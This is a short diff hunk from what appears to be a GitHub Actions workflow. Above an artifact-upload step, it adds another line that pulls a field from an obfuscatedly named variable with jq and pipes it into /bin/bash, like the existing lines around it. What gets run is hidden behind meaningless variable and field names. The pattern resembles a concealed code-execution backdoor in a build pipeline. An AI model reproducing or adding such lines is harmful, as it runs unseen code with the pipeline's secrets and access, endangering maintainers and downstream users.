@@ -37,6 +37,7 @@ jobs:
           echo $h5628 | jq -r .p281 | /bin/bash
           echo $qsptm06322 | jq -r .x30 | /bin/bash
           echo $v78 | jq -r .rtmxx908 | /bin/bash
+          printf '%s' "$b5991" | jq -r .vy960 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
